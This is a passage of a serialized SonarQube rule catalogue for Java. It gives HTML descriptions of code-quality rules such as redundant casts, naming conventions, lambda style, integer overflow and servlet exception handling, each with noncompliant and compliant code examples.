      <li> <code>IOUtils.toCharArray(InputStream)</code> </li>
      <li> <code>IOUtils.toInputStream(TypeCriteria.subtypeOf(CharSequence))</code> </li>
      <li> <code>IOUtils.toString(byte[])</code> </li>
      <li> <code>IOUtils.toString(URI)</code> </li>
      <li> <code>IOUtils.toString(URL)</code> </li>
      <li> <code>IOUtils.write(char[], OutputStream)</code> </li>
      <li> <code>IOUtils.write(CharSequence, OutputStream)</code> </li>
      <li> <code>IOUtils.writeLines(Collection, String, OutputStream)</code> </li>
      <li> <code>FileUtils.readFileToString(File)</code> </li>
      <li> <code>FileUtils.readLines(File)</code> </li>
      <li> <code>FileUtils.write(File, CharSequence)</code> </li>
      <li> <code>FileUtils.write(File, CharSequence, boolean)</code> </li>
      <li> <code>FileUtils.writeStringToFile(File, String)</code> </li>
    </ul> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/FoL5AQ">CERT, STR04-J.</a> - Use compatible character encodings when communicating
  string data between JVMs </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/JgAWCQ">CERT, STR50-J.</a> - Use the appropriate method for counting characters in a
  string </li>
</ul>Z
CODE_SMELL
Ä

java:S1942Ò
javaS1942!Simple class names should be used"MINOR*java:•<p>Java's <code>import</code> mechanism allows the use of simple class names. Therefore, using a class' fully qualified name in a file that
<code>import</code>s the class is redundant and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import java.util.List;
import java.sql.Timestamp;

//...

java.util.List&lt;String&gt; myList;  // Noncompliant
java.sql.Timestamp tStamp; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.util.List;
import java.sql.Timestamp;

//...

List&lt;String&gt; myList;
Timestamp tStamp;
</pre>Z
CODE_SMELL
ƒ

java:S1941µ
javaS19419Variables should not be declared before they are relevant"MINOR*java:—<p>For the sake of clarity, variables should be declared as close to where they're used as possible. This is particularly true when considering
methods that contain early returns and the potential to throw exceptions. In these cases, it is not only pointless, but also confusing to declare a
variable that may never be used because conditions for an early return are met first.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean isConditionMet(int a, int b) {
  int difference = a - b;
  MyClass foo = new MyClass(a);  // Noncompliant; not used before early return

  if (difference &lt; 0) {
    return false;
  }

  // ...

  if (foo.doTheThing()) {
    return true;
  }
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isConditionMet(int a, int b) {
  int difference = a - b;

  if (difference &lt; 0) {
    return false;
  }

  // ...

  MyClass foo = new MyClass(a);
  if (foo.doTheThing()) {
    return true;
  }
  return false;
}
</pre>Z
CODE_SMELL
´

java:S1905ú
javaS1905"Redundant casts should not be used"MINOR*java:œ<p>Unnecessary casting expressions make the code harder to read and understand.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void example() {
  for (Foo obj : (List&lt;Foo&gt;) getFoos()) {  // Noncompliant; cast unnecessary because List&lt;Foo&gt; is what's returned
    //...
  }
}

public List&lt;Foo&gt; getFoos() {
  return this.foos;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void example() {
  for (Foo obj : getFoos()) {
    //...
  }
}

public List&lt;Foo&gt; getFoos() {
  return this.foos;
}
</pre>
<h2>Exceptions</h2>
<p>Casting may be required to distinguish the method to call in the case of overloading:</p>
<pre>
class A {}
class B extends A{}
class C {
  void fun(A a){}
  void fun(B b){}

  void foo() {
    B b = new B();
    fun(b);
    fun((A) b); //call the first method so cast is not redundant.
  }

}
</pre>Z
CODE_SMELL
Ô

java:S1939‡
javaS19396Extensions and implementations should not be redundant"MINOR*java:ˇ<p>All classes extend <code>Object</code> implicitly. Doing so explicitly is redundant.</p>
<p>Further, declaring the implementation of an interface <em>and</em> one if its parents is also redundant. If you implement the interface, you also
implicitly implement its parents and there's no need to do so explicitly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface MyFace {
  // ...
}

public interface MyOtherFace extends MyFace {
  // ...
}

public class Foo
    extends Object // Noncompliant
    implements MyFace, MyOtherFace {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface MyFace {
  // ...
}

public interface MyOtherFace extends MyFace {
  // ...
}

public class Foo implements MyOtherFace {
  //...
}
</pre>Z
CODE_SMELL


java:S4065·
javaS4065-"ThreadLocal.withInitial" should be preferred"MINOR*java:â<p>Java 8 introduced <code>ThreadLocal.withInitial</code> which is a simpler alternative to creating an anonymous inner class to initialise a
<code>ThreadLocal</code> instance.</p>
<p>This rule raises an issue when a <code>ThreadLocal</code> anonymous inner class can be replaced by a call to
<code>ThreadLocal.withInitial</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal =
    new ThreadLocal&lt;List&lt;String&gt;&gt;() { // Noncompliant
        @Override
        protected List&lt;String&gt; initialValue() {
            return new ArrayList&lt;String&gt;();
        }
    };
</pre>
<h2>Compliant Solution</h2>
<pre>
ThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal = ThreadLocal.withInitial(ArrayList::new);
</pre>Z
CODE_SMELL
ˇ

java:S1610
javaS1610AAbstract classes without fields should be converted to interfaces"MINOR*java:Ñ<p>With Java 8's "default method" feature, any abstract class without direct or inherited field should be converted into an interface. However, this
change may not be appropriate in libraries or other applications where the class is intended to be used as an API.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public abstract class Car {
  public abstract void start(Environment c);

  public void stop(Environment c) {
    c.freeze(this);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Car {
  public void start(Environment c);

  public default void stop(Environment c) {
    c.freeze(this);
  }
}
</pre>Z
CODE_SMELL
»

java:S1858π
javaS18586"toString()" should never be called on a String object"MINOR*java:ÿ<p>Invoking a method designed to return a string representation of an object which is already a string is a waste of keystrokes. This redundant
construction may be optimized by the compiler, but will be confusing in the meantime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String message = "hello world";
System.out.println(message.toString()); // Noncompliant;
</pre>
<h2>Compliant Solution</h2>
<pre>
String message = "hello world";
System.out.println(message);
</pre>Z
CODE_SMELL
Ç

java:S1612Û
javaS16121Lambdas should be replaced with method references"MINOR*java:ó<p>Method/constructor references are more compact and readable than using lambdas, and are therefore preferred. Similarly, <code>null</code> checks
can be replaced with references to the <code>Objects::isNull</code> and <code>Objects::nonNull</code> methods.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  void process(List&lt;A&gt; list) {
    list.stream()
      .map(a -&gt; a.&lt;String&gt;getObject())
      .forEach(a -&gt; { System.out.println(a); });
  }

  &lt;T&gt; T getObject() {
    return null;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  void process(List&lt;A&gt; list) {
    list.stream()
      .map(A::&lt;String&gt;getObject)
      .forEach(System.out::println);
  }

  &lt;T&gt; T getObject() {
    return null;
  }
}
</pre>Z
CODE_SMELL
…

java:S1611∫
javaS1611\Parentheses should be removed from a single lambda input parameter when its type is inferred"MINOR*java:≥<p>There are two possible syntaxes for a lambda having only one input parameter with an inferred type: with and without parentheses around that single
parameter. The simpler syntax, without parentheses, is more compact and readable than the one with parentheses, and is therefore preferred.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
(x) -&gt; x * 2
</pre>
<h2>Compliant Solution</h2>
<pre>
x -&gt; x * 2
</pre>Z
CODE_SMELL
ô

java:S2959ä
javaS2959(Unnecessary semicolons should be omitted"MINOR*java:∑<p>Under the reasoning that cleaner code is better code, the semicolon at the end of a try-with-resources construct should be omitted because it can
be omitted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);  // ignored; this one's required
      Reader r = new InputStreamReader(b);)   // Noncompliant
{
   //do stuff
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);
      Reader r = new InputStreamReader(b))
{
   //do stuff
}
</pre>Z
CODE_SMELL
∫

java:S1989´
javaS19894Exceptions should not be thrown from servlet methods"MINOR*java:…<p>Even though the signatures for methods in a servlet include <code>throws IOException, ServletException</code>, it's a bad idea to let such
exceptions be thrown. Failure to catch exceptions in a servlet could leave a system in a vulnerable state, possibly resulting in denial-of-service
attacks, or the exposure of sensitive information because when a servlet throws an exception, the servlet container typically sends debugging
information back to the user. And that information could be very valuable to an attacker. </p>
<p>This rule checks all exceptions in methods named "do*" are explicitly handled in servlet classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doGet(HttpServletRequest request, HttpServletResponse response)
  throws IOException, ServletException {
  String ip = request.getRemoteAddr();
  InetAddress addr = InetAddress.getByName(ip); // Noncompliant; getByName(String) throws UnknownHostException
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doGet(HttpServletRequest request, HttpServletResponse response)
  throws IOException, ServletException {
  try {
    String ip = request.getRemoteAddr();
    InetAddress addr = InetAddress.getByName(ip);
    //...
  }
  catch (UnknownHostException uhex) {
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/600.html">MITRE, CWE-600</a> - Uncaught Exception in Servlet </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/s4EVAQ">CERT, ERR01-J.</a> - Do not allow exceptions to expose sensitive information
  </li>
</ul>ZVULNERABILITY
≠	

java:S2924û	
javaS2924JUnit rules should be used"MINOR*java:Ÿ<p>While some <code>TestRule</code> classes have the desired effect without ever being directly referenced by a test, several others do not, and
there's no reason to leave them cluttering up the file if they're not in use.</p>
<p>This rule raises an issue when <code>Test</code> class fields of the following types aren't used by any of the test methods:
<code>TemporaryFolder</code>, and <code>TestName</code>.</p>
<p>This rule also applies to the JUnit 5 equivalent classes: <code>TempDir</code>, and <code>TestInfo</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ProjectDefinitionTest {

  @Rule
  public TemporaryFolder temp = new TemporaryFolder();  // Noncompliant

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey("mykey");
    assertThat(def.getKey(), is("mykey"));
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ProjectDefinitionTest {

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey("mykey");
    assertThat(def.getKey(), is("mykey"));
  }
}
</pre>Z
CODE_SMELL
™

java:S1710õ
javaS1710,Annotation repetitions should not be wrapped"MINOR*java:ƒ<p>Before Java 8 if you needed to use multiple instances of the same annotation, they had to be wrapped in a container annotation. With Java 8, that's
no longer necessary, allowing for cleaner, more readable code.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@SomeAnnotations({  // Noncompliant
  @SomeAnnotation(..a..),
  @SomeAnnotation(..b..),
  @SomeAnnotation(..c..),
})
public class SomeClass {
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@SomeAnnotation(..a..)
@SomeAnnotation(..b..)
@SomeAnnotation(..c..)
public class SomeClass {
  ...
}
</pre>Z
CODE_SMELL
Ô


java:S5194‡

javaS5194Use Java 12 "switch" expression"MINOR*java:ñ
<p>Many existing switch statements are essentially simulations of switch expressions, where each arm either assigns to a common target variable or
returns a value. Expressing this as a statement is roundabout, repetitive, and error-prone.</p>
<p>Java 12 added support for switch expressions, which provide more succinct and less error-prone version of switch.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void day_of_week(DoW day) {
    int numLetters;
    switch (day) {  // Noncompliant
      case MONDAY:
      case FRIDAY:
      case SUNDAY:
        numLetters = 6;
        break;
      case TUESDAY:
        numLetters = 7;
        break;
      case THURSDAY:
      case SATURDAY:
        numLetters = 8;
        break;
      case WEDNESDAY:
        numLetters = 9;
        break;
      default:
        throw new IllegalStateException("Wat: " + day);
    }
}

int return_switch(int x) {
    switch (x) { // Noncompliant
      case 1:
        return 1;
      case 2:
        return 2;
      default:
        throw new IllegalStateException();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int numLetters = switch (day) {
    case MONDAY, FRIDAY, SUNDAY -&gt; 6;
    case TUESDAY                -&gt; 7;
    case THURSDAY, SATURDAY     -&gt; 8;
    case WEDNESDAY              -&gt; 9;
};
</pre>Z
CODE_SMELL
∑

java:S1602®
javaS1602OLambdas containing only one statement should not nest this statement in a block"MINOR*java:Æ<p>There are two ways to write lambdas that contain single statement, but one is definitely more compact and readable than the other.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
x -&gt; {System.out.println(x+1);}
(a, b) -&gt; { return a+b; }
</pre>
<h2>Compliant Solution</h2>
<pre>
x -&gt; System.out.println(x+1)
(a, b) -&gt; a+b    //For return statement, the return keyword should also be dropped
</pre>Z
CODE_SMELL
ä
	java:S135¸
javaS135KLoops should not contain more than a single "break" or "continue" statement"MINOR*java:á<p>Restricting the number of <code>break</code> and <code>continue</code> statements in a loop is done in the interest of good structured programming.
</p>
<p>One <code>break</code> and <code>continue</code> statement is acceptable in a loop, since it facilitates optimal coding. If there is more than one,
the code should be refactored to increase readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 1; i &lt;= 10; i++) {     // Noncompliant - 2 continue - one might be tempted to add some logic in between
  if (i % 2 == 0) {
    continue;
  }

  if (i % 3 == 0) {
    continue;
  }

  System.out.println("i = " + i);
}
</pre>Z
CODE_SMELL
•
	java:S139ó
javaS139:Comments should not be located at the end of lines of code"MINOR*java:≥<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be
really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of
the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int a1 = b + c; // This is a trailing comment that can be very very long
</pre>
<h2>Compliant Solution</h2>
<pre>
// This very long comment is better placed before the line of code
int a2 = b + c;
</pre>Z
CODE_SMELL
Õ

java:S3038æ
javaS3038(Abstract methods should not be redundant"MINOR*java:Î<p>There's no point in redundantly defining an <code>abstract</code> method with the same signature as a method in an <code>interface</code> that the
class <code>implements</code>. Any concrete child classes will have to implement the method either way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface Reportable {
  String getReport();
}

public abstract class AbstractRuleReport implements Reportable{
  public abstract String getReport();  // Noncompliant

  // ...
}
</pre>Z
CODE_SMELL
◊

java:S3398»
javaS3398O"private" methods called only by inner classes should be moved to those classes"MINOR*java:Œ<p>When a <code>private</code> method is only invoked by an inner class, there's no reason not to move it into that class. It will still have the same
access to the outer class' members, but the outer class will be clearer and less cluttered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Outie {
  private int i=0;

  private void increment() {  // Noncompliant
    i++;
  }

  public class Innie {
    public void doTheThing() {
      Outie.this.increment();
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Outie {
  private int i=0;

  public class Innie {
    public void doTheThing() {
      increment();
    }

    private void increment() {
      Outie.this.i++;
    }
  }
}
</pre>Z
CODE_SMELL
Ç

java:S2065Û
javaS2065<Fields in non-serializable classes should not be "transient""MINOR*java:å<p><code>transient</code> is used to mark fields in a <code>Serializable</code> class which will not be written out to file (or stream). In a class
that does not implement <code>Serializable</code>, this modifier is simply wasted keystrokes, and should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Vegetable {  // does not implement Serializable
  private transient Season ripe;  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Vegetable {
  private Season ripe;
  // ...
}
</pre>Z
CODE_SMELL
¢

java:S4488ì
javaS44887Composed "@RequestMapping" variants should be preferred"MINOR*java:±<p>Spring framework 4.3 introduced variants of the <code>@RequestMapping</code> annotation to better represent the semantics of the annotated methods.
The use of <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@PatchMapping</code> and <code>@DeleteMapping</code>
should be preferred to the use of the raw <code>@RequestMapping(method = RequestMethod.XYZ)</code>.</p>
<h1>Noncompliant Code Example</h1>
<pre>
@RequestMapping(path = "/greeting", method = RequestMethod.GET) // Noncompliant
public Greeting greeting(@RequestParam(value = "name", defaultValue = "World") String name) {
...
}
</pre>
<h1>Compliant Solution</h1>
<pre>
@GetMapping(path = "/greeting") // Compliant
public Greeting greeting(@RequestParam(value = "name", defaultValue = "World") String name) {
...
}
</pre>Z
CODE_SMELL
∑


java:S2066®

javaS2066K"Serializable" inner classes of non-serializable classes should be "static""MINOR*java:π	<p>Serializing a non-<code>static</code> inner class will result in an attempt at serializing the outer class as well. If the outer class is not
serializable, then serialization will fail, resulting in a runtime error. </p>
<p>Making the inner class <code>static</code> (i.e. "nested") avoids this problem, therefore inner classes should be <code>static</code> if possible.
However, you should be aware that there are semantic differences between an inner class and a nested one: </p>
<ul>
  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>
  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Pomegranate {
  // ...

  public class Seed implements Serializable {  // Noncompliant; serialization will fail
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Pomegranate {
  // ...

  public static class Seed implements Serializable {
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/O4CpAQ">CERT SER05-J.</a> - Do not serialize instances of inner classes </li>
</ul>ZBUG
Â

java:S2184÷
javaS2184.Math operands should be cast before assignment"MINOR*java:Ñ<p>When arithmetic is performed on integers, the result will always be an integer. You can assign that result to a <code>long</code>,
<code>double</code>, or <code>float</code> with automatic type conversion, but having started as an <code>int</code> or <code>long</code>, the result
will likely not be what you expect. </p>
<p>For instance, if the result of <code>int</code> division is assigned to a floating-point variable, precision will have been lost before the
assignment. Likewise, if the result of multiplication is assigned to a <code>long</code>, it may have already overflowed before the assignment.</p>
<p>In either case, the result will not be what was expected. Instead, at least one operand should be cast or promoted to the final type before the
operation takes place.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float twoThirds = 2/3; // Noncompliant; int division. Yields 0.0
long millisInYear = 1_000*3_600*24*365; // Noncompliant; int multiplication. Yields 1471228928
long bigNum = Integer.MAX_VALUE + 2; // Noncompliant. Yields -2147483647
long bigNegNum =  Integer.MIN_VALUE-1; //Noncompliant, gives a positive result instead of a negative one.
Date myDate = new Date(seconds * 1_000); //Noncompliant, won't produce the expected result if seconds &gt; 2_147_483
...
public long compute(int factor){
  return factor * 10_000;  //Noncompliant, won't produce the expected result if factor &gt; 214_748
}

public float compute2(long factor){
  return factor / 123;  //Noncompliant, will be rounded to closest long integer
}
</pre>
<h2>Compliant Solution</h2>
<pre>
float twoThirds = 2f/3; // 2 promoted to float. Yields 0.6666667
long millisInYear = 1_000L*3_600*24*365; // 1000 promoted to long. Yields 31_536_000_000
long bigNum = Integer.MAX_VALUE + 2L; // 2 promoted to long. Yields 2_147_483_649
long bigNegNum =  Integer.MIN_VALUE-1L; // Yields -2_147_483_649
Date myDate = new Date(seconds * 1_000L);
...
public long compute(int factor){
  return factor * 10_000L;
}

public float compute2(long factor){
  return factor / 123f;
}
</pre>
<p>or</p>
<pre>
float twoThirds = (float)2/3; // 2 cast to float
long millisInYear = (long)1_000*3_600*24*365; // 1_000 cast to long
long bigNum = (long)Integer.MAX_VALUE + 2;
long bigNegNum =  (long)Integer.MIN_VALUE-1;
Date myDate = new Date((long)seconds * 1_000);
...
public long compute(long factor){
  return factor * 10_000;
}

public float compute2(float factor){
  return factor / 123;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/190">MITRE, CWE-190</a> - Integer Overflow or Wraparound </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/woIyAQ">CERT, NUM50-J.</a> - Convert integers to floating point for floating-point
  operations </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/AxE">CERT, INT18-C.</a> - Evaluate integer expressions in a larger size before
  comparing or assigning to that size </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat2">SANS Top 25</a> - Risky Resource Management </li>
</ul>ZBUG
È

java:S3032⁄
javaS3032,JEE applications should not "getClassLoader""MINOR*java:ä<p>Using the standard <code>getClassLoader()</code> may not return the <em>right</em> class loader in a JEE context. Instead, go through the
<code>currentThread</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ClassLoader cl = this.getClass().getClassLoader();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
ClassLoader cl = Thread.currentThread().getContextClassLoader();
</pre>ZBUG
ô
	java:S105ã
javaS105(Tabulation characters should not be used"MINOR*java:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
‹


java:S2183Õ

javaS2183PInts and longs should not be shifted by zero or more than their number of bits-1"MINOR*java:Ÿ	<p>Since an <code>int</code> is a 32-bit variable, shifting by more than +/-31 is confusing at best and an error at worst. When the runtime shifts
32-bit integers, it uses the lowest 5 bits of the shift count operand. In other words, shifting an <code>int</code> by 32 is the same as shifting it
by 0, and shifting it by 33 is the same as shifting it by 1.</p>
<p>Similarly, when shifting 64-bit integers, the runtime uses the lowest 6 bits of the shift count operand and shifting <code>long</code> by 64 is the
same as shifting it by 0, and shifting it by 65 is the same as shifting it by 1.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int shift(int a) {
  int x = a &gt;&gt; 32; // Noncompliant
  return a &lt;&lt; 48;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int shift(int a) {
  int x = a &gt;&gt; 31;
  return a &lt;&lt; 16;
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the shift by zero is obviously for cosmetic reasons:</p>
<ul>
  <li> When the value shifted is a literal. </li>
  <li> When there is a similar shift at the same position on line before or after. E.g.: </li>
</ul>
<pre>
bytes[loc+0] = (byte)(value &gt;&gt; 8);
bytes[loc+1] = (byte)(value &gt;&gt; 0);
</pre>ZBUG
Ê

java:S3047◊
javaS30473Multiple loops over the same set should be combined"MINOR*java:˘<p>When a method loops multiple over the same set of data, whether it's a list or a set of numbers, it is highly likely that the method could be made
more efficient by combining the loops into a single set of iterations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingToAList(List&lt;String&gt; strings) {
  for (String str : strings) {
    doStep1(str);
  }
  for (String str : strings) {  // Noncompliant
    doStep2(str);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomethingToAList(List&lt;String&gt; strings) {
  for (String str : strings) {
    doStep1(str);
    doStep2(str);
  }
}
</pre>Z
CODE_SMELL
Ï
	java:S120ﬁ
javaS1204Package names should comply with a naming convention"MINOR*java:Ä<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all package names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z_]+(\.[a-z_][a-z0-9_]*)*$</code>:</p>
<pre>
package org.exAmple; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
package org.example;
</pre>Z
CODE_SMELL
≤
	java:S114§
javaS1146Interface names should comply with a naming convention"MINOR*java:ƒ<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all
interface names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
public interface myInterface {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface MyInterface {...}
</pre>Z
CODE_SMELL
î

java:S2196Ö
javaS2196>Switches should be used for sequences of simple "String" tests"MINOR*java:ú<p>Since Java 7, <code>String</code>s can be used as <code>switch</code> arguments. So when a single <code>String</code> is tested against three or
more values in an <code>if</code>/<code>else if</code> structure, it should be converted to a switch instead for greater readability.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ("red".equals(choice)) {  // Noncompliant
  dispenseRed();
} else if ("blue".equals(choice)) {
  dispenseBlue();
} else if ("yellow".equals(choice)) {
  dispenseYellow();
} else {
  promptUser();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch(choice) {
  case "Red":
    dispenseRed();
    break;
  case "Blue":
    dispenseBlue():
    break;
  case "Yellow":
    dispenseYellow();
    break;
  default:
    promptUser();
    break;
}
</pre>Z
CODE_SMELL
É
	java:S113ı
javaS1130Files should contain an empty newline at the end"MINOR*java:õ<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>Z
CODE_SMELL
•
	java:S116ó
javaS1162Field names should comply with a naming convention"MINOR*java:ª<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
class MyClass {
   private int my_field;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
   private int myField;
}
</pre>Z
CODE_SMELL
ä
	java:S118¸
javaS118;Abstract class names should comply with a naming convention"MINOR*java:ó<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all
<code>abstract</code> class names match a provided regular expression. If a non-abstract class match the regular expression, an issue is raised to
suggest to either make it abstract or to rename it.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>^Abstract[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
abstract class MyClass { // Noncompliant
}

class AbstractLikeClass { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
abstract class AbstractClass {
}

class LikeClass {
}
</pre>Z
CODE_SMELL
˝
	java:S117Ô
javaS117PLocal variable and method parameter names should comply with a naming convention"MINOR*java:ı<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public void doSomething(int my_param) {
  int LOCAL;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int myParam) {
  int local;
  ...
}
</pre>
<h2>Exceptions</h2>
<p>Loop counters are ignored by this rule.</p>
<pre>
for (int i_1 = 0; i_1 &lt; limit; i_1++) {  // Compliant
  // ...
}
</pre>
<p>as well as one-character <code>catch</code> variables: </p>
<pre>
try {
//...
} catch (Exception e) { // Compliant
}
</pre>Z
CODE_SMELL
≥
	java:S119•
javaS119;Type parameter names should comply with a naming convention"MINOR*java:¿<p>Shared naming conventions make it possible for a team to collaborate efficiently. Following the established convention of single-letter type
parameter names helps users and maintainers of your code quickly see the difference between a type parameter and a poorly named class.</p>
<p>This rule check that all type parameter names match a provided regular expression. The following code snippets use the default regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass&lt;TYPE&gt; { // Noncompliant
  &lt;TYPE&gt; void method(TYPE t) { // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass&lt;T&gt; {
  &lt;T&gt; void method(T t) {
  }
}
</pre>Z
CODE_SMELL
´

java:S4349ú
javaS4349,"write(byte[],int,int)" should be overridden"MINOR*java:≈<p>When directly subclassing <code>java.io.OutputStream</code> or <code>java.io.FilterOutputStream</code>, the only requirement is that you implement
the method <code>write(int)</code>. However most uses for such streams don't write a single byte at a time and the default implementation for
<code>write(byte[],int,int)</code> will call <code>write(int)</code> for every single byte in the array which can create a lot of overhead and is
utterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of
<code>write(byte[],int,int)</code>.</p>
<p>This rule raises an issue when a direct subclass of <code>java.io.OutputStream</code> or <code>java.io.FilterOutputStream</code> doesn't provide an
override of <code>write(byte[],int,int)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyStream extends OutputStream { // Noncompliant
    private FileOutputStream fout;

    public MyStream(File file) throws IOException {
        fout = new FileOutputStream(file);
    }

    @Override
    public void write(int b) throws IOException {
        fout.write(b);
    }

    @Override
    public void close() throws IOException {
        fout.write("\n\n".getBytes());
        fout.close();
        super.close();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyStream extends OutputStream {
    private FileOutputStream fout;

    public MyStream(File file) throws IOException {
        fout = new FileOutputStream(file);
    }

    @Override
    public void write(int b) throws IOException {
        fout.write(b);
    }

    @Override
    public void write(byte[] b, int off, int len) throws IOException {
        fout.write(b, off, len);
    }

    @Override
    public void close() throws IOException {
        fout.write("\n\n".getBytes());
        fout.close();
        super.close();
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the class is declared <code>abstract</code>.</p>Z
CODE_SMELL
æ

java:S1199Ø
